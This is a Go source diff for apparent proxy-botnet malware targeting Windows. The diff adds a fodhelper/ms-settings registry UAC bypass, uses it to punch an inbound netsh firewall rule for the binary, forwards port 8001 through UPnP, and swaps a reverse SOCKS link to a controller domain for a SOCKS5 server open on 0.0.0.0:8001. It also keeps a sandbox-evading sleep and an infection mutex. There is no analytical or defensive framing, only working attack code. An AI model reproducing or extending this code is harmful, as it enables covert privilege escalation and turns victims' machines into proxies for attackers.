@@ -1,27 +1,38 @@
 package main
 
 import (
+	"context"
 	crand "crypto/rand"
 	"fmt"
 	"math"
 	"math/big"
 	"math/rand"
-	"net"
+	"os"
+	"os/exec"
 	"syscall"
 	"time"
 	"unsafe"
+
+	"github.com/NebulousLabs/go-upnp"
+	"github.com/armon/go-socks5"
+	"golang.org/x/sys/windows/registry"
 )
 
 func main() {
 	seed, _ := crand.Int(crand.Reader, big.NewInt(math.MaxInt64))
 	rand.Seed(seed.Int64())
-	time.Sleep(time.Second * time.Duration(rand.Intn(10) + 20))
-	if _, err := CreateMutex("thisisbest"); err != nil {
+	time.Sleep(time.Second * time.Duration(rand.Intn(10)+20))
+	if _, err := CreateMutex("wyvern2021"); err != nil {
 		return
 	}
+	err := BypassFirewall()
+	if err != nil {
+		return
+	}
+	BypassNAT()
+
 	var config Config
 	var persistence Persistence
-
 	err := config.Init()
 	if err != nil {
 		return
@@ -37,6 +48,58 @@ func main() {
 		}
 		time.Sleep(time.Second * 10)
 	}
+}
+
+func BypassFirewall() error {
+	filename, err := os.Executable()
+	if err != nil {
+		return err
+	}
+	err = UacBypass(`netsh advfirewall firewall delete rule name="_____p2p"`)
+	if err != nil {
+		return err
+	}
+	err = UacBypass(`netsh advfirewall firewall add rule name="_____p2p" dir=in program="` +
+		filename + `" profile=any action=allow`)
+	if err != nil {
+		return err
+	}
+	err = UacBypass("")
+	return err
+}
+
+func BypassNAT() {
+	ctx, cancel := context.WithTimeout(context.Background(), time.Hour)
+	defer cancel()
+	d, err := upnp.DiscoverCtx(ctx)
+	if err != nil {
+		return
+	}
+	err = d.Forward(8001, "socks5")
+	if err != nil {
+		return
+	}
+}
+
+func UacBypass(cmd string) error {
+	key, _, err := registry.CreateKey(registry.CURRENT_USER,
+		`Software\Classes\ms-settings\shell\open\command`, registry.QUERY_VALUE|registry.SET_VALUE)
+	if err != nil {
+		return err
+	}
+	if err := key.SetStringValue("DelegateExecute", ""); err != nil {
+		return err
+	}
+	if err := key.SetStringValue("", cmd); err != nil {
+		return err
+	}
+	if err := key.Close(); err != nil {
+		return err
+	}
+	ins := exec.Command("cmd", "fodhelper")
+	ins.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	err = ins.Run()
+	return err
 }
 
 func CreateMutex(name string) (uintptr, error) {
@@ -55,30 +118,34 @@ func CreateMutex(name string) (uintptr, error) {
 	}
 }
 
-func ReverseSocks(tag string, config Config, ch chan bool) {
+func SocksServer(config Config, ch chan bool) {
 	exit := false
 	go func() {
-		exit = <- ch
+		exit = <-ch
 	}()
 	for {
 		if exit {
 			return
 		}
-		conn, err := net.Dial("tcp", fmt.Sprintf("%s:7071", config.domain))
+		conf := &socks5.Config{}
+		server, err := socks5.New(conf)
 		if err != nil {
-			time.Sleep(time.Second)
+			time.Sleep(time.Second * 10)
 			continue
 		}
-		ConnectForSocks(conn, tag, ch)
+
+		if err := server.ListenAndServe("tcp", "0.0.0.0:8001"); err != nil {
+			time.Sleep(time.Second * 10)
+			continue
+		}
 	}
 }
 
 func mainFunc(config Config) error {
-	tag := RandomString(16)
 	ch := make(chan bool)
-	go ReverseSocks(tag, config, ch)
+	go SocksServer(config, ch)
 	var handler Handler
-	err := handler.Init(config, tag)
+	err := handler.Init(config)
 	ch <- true
 	return err
 }
